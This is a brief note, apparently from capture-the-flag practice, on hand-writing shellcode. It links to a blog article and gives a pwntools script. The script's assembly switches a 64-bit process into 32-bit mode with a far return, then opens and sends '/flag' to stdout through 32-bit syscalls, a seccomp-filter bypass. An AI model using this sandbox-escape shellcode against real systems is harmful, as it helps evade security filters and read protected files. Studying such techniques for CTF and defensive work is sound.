write shellcode by hand:   
https://www.cnblogs.com/ZIKH26/articles/15845766.html
asm code:   
```
#!/usr/bin/python3
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=asm('''
mov rsp, 0x1337500
    call to32
    push 0x67
    push 0x616c662f
    mov ebx, esp
    mov ecx, 0
    mov eax, 5
    int 0x80
    mov ebx, 1
    mov ecx, eax
    mov edx, 0
    mov esi, 0x3e8
    mov eax, 0xbb
    int 0x80
to32:
    mov dword ptr [rsp + 4], 0x23
    retf''')
```
